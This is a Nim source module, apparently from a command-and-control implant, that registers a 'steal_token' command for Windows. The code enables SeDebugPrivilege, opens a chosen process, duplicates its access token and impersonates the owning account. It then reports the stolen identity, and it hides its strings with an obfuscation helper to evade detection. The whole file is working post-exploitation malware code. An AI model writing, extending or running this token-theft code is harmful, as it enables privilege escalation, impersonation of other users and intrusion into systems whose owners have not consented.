import std/[json, strutils]
import core/types
import commands/registry
import crypto/strenc
import commands/execution/token_mgr

when defined(windows):
  type
    HANDLE   = int
    DWORD    = uint32
    BOOL     = int32
    WCHAR    = uint16
    LPWSTR   = ptr WCHAR
    SID_NAME_USE = int32
    SECURITY_IMPERSONATION_LEVEL = int32
    TOKEN_TYPE = int32

  const
    PROCESS_QUERY_INFORMATION    = DWORD(0x0400)
    PROCESS_VM_READ              = DWORD(0x0010)
    TOKEN_DUPLICATE              = DWORD(0x0002)
    TOKEN_QUERY                  = DWORD(0x0008)
    TOKEN_ALL_ACCESS             = DWORD(0xF01FF)
    TOKEN_IMPERSONATE            = DWORD(0x0004)
    TOKEN_ADJUST_PRIVILEGES      = DWORD(0x0020)
    SecurityImpersonation        = SECURITY_IMPERSONATION_LEVEL(2)
    TokenImpersonation           = TOKEN_TYPE(2)
    TokenUser_Info               = int32(1)
    SE_PRIVILEGE_ENABLED         = DWORD(0x00000002)

  type
    LUID = object
      LowPart: DWORD
      HighPart: int32
    LUID_ATTR = object
      Luid: LUID
      Attributes: DWORD
    TOKEN_PRIVS = object
      PrivilegeCount: DWORD
      Privileges: array[1, LUID_ATTR]
    SID_AND_ATTRS = object
      Sid: pointer
      Attributes: DWORD
    TOKEN_USER_T = object
      User: SID_AND_ATTRS

  proc OpenProcess(da: DWORD, inh: BOOL, pid: DWORD): HANDLE
    {.importc: "OpenProcess", dynlib: "kernel32".}
  proc CloseHandle(h: HANDLE): BOOL
    {.importc: "CloseHandle", dynlib: "kernel32".}
  proc GetCurrentProcess(): HANDLE
    {.importc: "GetCurrentProcess", dynlib: "kernel32".}
  proc OpenProcessToken(ph: HANDLE, da: DWORD, th: ptr HANDLE): BOOL
    {.importc: "OpenProcessToken", dynlib: "advapi32".}
  proc DuplicateTokenEx(h: HANDLE, da: DWORD, attr: pointer,
                        il: SECURITY_IMPERSONATION_LEVEL, tt: TOKEN_TYPE,
                        phNewToken: ptr HANDLE): BOOL
    {.importc: "DuplicateTokenEx", dynlib: "advapi32".}
  proc ImpersonateLoggedOnUser(h: HANDLE): BOOL
    {.importc: "ImpersonateLoggedOnUser", dynlib: "advapi32".}
  proc LookupPrivilegeValueA(sys: cstring, name: cstring, luid: ptr LUID): BOOL
    {.importc: "LookupPrivilegeValueA", dynlib: "advapi32".}
  proc AdjustTokenPrivileges(th: HANDLE, dis: BOOL, ns: ptr TOKEN_PRIVS,
                              bl: DWORD, ps: ptr TOKEN_PRIVS, rl: ptr DWORD): BOOL
    {.importc: "AdjustTokenPrivileges", dynlib: "advapi32".}
  proc GetTokenInformation(th: HANDLE, tic: int32, ti: pointer,
                            til: DWORD, rl: ptr DWORD): BOOL
    {.importc: "GetTokenInformation", dynlib: "advapi32".}
  proc LookupAccountSidW(sys: LPWSTR, sid: pointer, name: LPWSTR,
                          cchName: ptr DWORD, dom: LPWSTR,
                          cchDom: ptr DWORD, use: ptr SID_NAME_USE): BOOL
    {.importc: "LookupAccountSidW", dynlib: "advapi32".}

  proc enableDebugPriv() =
    var hToken: HANDLE
    if OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
                        addr hToken) == 0: return
    defer: discard CloseHandle(hToken)
    var tp: TOKEN_PRIVS
    tp.PrivilegeCount = 1
    if LookupPrivilegeValueA(nil, "SeDebugPrivilege",
                             addr tp.Privileges[0].Luid) == 0: return
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    discard AdjustTokenPrivileges(hToken, 0, addr tp,
                                  DWORD(sizeof(tp)), nil, nil)

  proc tokenUsername(h: HANDLE): string =
    var needed: DWORD = 0
    discard GetTokenInformation(h, TokenUser_Info, nil, 0, addr needed)
    if needed == 0: return "unknown"
    var buf = newSeq[byte](needed)
    if GetTokenInformation(h, TokenUser_Info, addr buf[0], needed, addr needed) == 0:
      return "unknown"
    let tu = cast[ptr TOKEN_USER_T](addr buf[0])
    var nLen: DWORD = 256
    var dLen: DWORD = 256
    var nBuf = newSeq[WCHAR](256)
    var dBuf = newSeq[WCHAR](256)
    var use:  SID_NAME_USE
    if LookupAccountSidW(nil, tu.User.Sid, addr nBuf[0], addr nLen,
                         addr dBuf[0], addr dLen, addr use) == 0:
      return "unknown"
    var dom = ""
    var name = ""
    for i in 0..<int(dLen):
      if dBuf[i] == 0: break
      dom.add(char(dBuf[i] and 0xFF))
    for i in 0..<int(nLen):
      if nBuf[i] == 0: break
      name.add(char(nBuf[i] and 0xFF))
    result = dom & "\\" & name

proc stealTokenExecute(taskId: string, params: JsonNode,
                       state: AgentState, send: SendMsg): TaskResult =
  when not defined(windows):
    return TaskResult(output: hidstr("steal_token: Windows only"),
                      status: "error", completed: true)
  else:
    let pid = DWORD(params{"pid"}.getInt(0))
    if pid == 0:
      return TaskResult(output: hidstr("Error: pid required"),
                        status: "error", completed: true)

    enableDebugPriv()

    let hProc = OpenProcess(
      PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, 0, pid)
    if hProc == 0:
      return TaskResult(
        output: hidstr("Error: OpenProcess failed for PID ") & $pid,
        status: "error", completed: true)
    defer: discard CloseHandle(hProc)

    var hToken: HANDLE
    if OpenProcessToken(hProc,
                        TOKEN_DUPLICATE or TOKEN_QUERY or TOKEN_IMPERSONATE,
                        addr hToken) == 0:
      return TaskResult(output: hidstr("Error: OpenProcessToken failed"),
                        status: "error", completed: true)
    defer: discard CloseHandle(hToken)

    var hDup: HANDLE
    if DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nil,
                        SecurityImpersonation, TokenImpersonation,
                        addr hDup) == 0:
      return TaskResult(output: hidstr("Error: DuplicateTokenEx failed"),
                        status: "error", completed: true)

    if ImpersonateLoggedOnUser(hDup) == 0:
      discard CloseHandle(hDup)
      return TaskResult(
        output: hidstr("Error: ImpersonateLoggedOnUser failed"),
        status: "error", completed: true)

    if gImpersonatedToken != 0:
      discard CloseHandle(gImpersonatedToken)
    gImpersonatedToken = hDup

    let uname = tokenUsername(hDup)
    return TaskResult(
      output: hidstr("Token stolen from PID ") & $pid &
              hidstr(" - impersonating ") & uname,
      status: "success", completed: true)

proc initStealToken*() =
  register(hidstr("steal_token"), stealTokenExecute)
